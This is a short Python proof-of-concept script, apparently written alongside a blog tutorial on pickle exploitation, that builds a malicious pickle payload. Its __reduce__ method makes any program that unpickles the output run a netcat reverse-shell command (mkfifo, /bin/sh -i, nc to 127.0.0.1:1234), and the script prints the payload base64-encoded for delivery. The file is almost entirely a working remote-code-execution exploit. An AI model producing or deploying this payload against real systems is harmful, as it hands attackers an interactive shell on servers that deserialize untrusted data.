#!/usr/bin/env python3

import base64
import os
import pickle

"""
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

Solution: https://gist.github.com/pythoninthegrass/c93158660e493625e4f8cd78e099c876
"""

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
